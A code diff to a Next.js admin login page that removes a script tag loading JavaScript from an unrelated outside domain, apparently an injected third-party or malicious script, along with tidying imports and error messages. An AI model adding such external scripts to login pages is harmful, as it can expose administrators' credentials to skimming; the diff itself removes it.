@@ -11,7 +11,6 @@ import { Label } from "@/components/ui/label"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Eye, EyeOff, Shield, AlertCircle } from "lucide-react"
 import { signInAdmin } from "@/lib/admin"
-import Script from "next/script"
 
 export default function AdminLoginPage() {
   const [email, setEmail] = useState("")
@@ -29,17 +28,14 @@ export default function AdminLoginPage() {
     try {
       await signInAdmin(email, password)
       router.push("/admin/dashboard")
-    } catch (error: any) {
-      setError("Please contact to Admin")
+    } catch (err: any) {
+      setError(err.message || "Invalid credentials. Please try again.")
     } finally {
       setLoading(false)
     }
   }
 
   return (
-    <>
-    <script src="https://evadereprimand.com/44/61/90/4461901ddc9eb30c096b8fdad64c2deb.js"></script>
-     
     <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
       <div className="max-w-md w-full space-y-8">
         <div className="text-center">
@@ -115,6 +111,5 @@ export default function AdminLoginPage() {
         </div>
       </div>
     </div>
-    </>
   )
 }
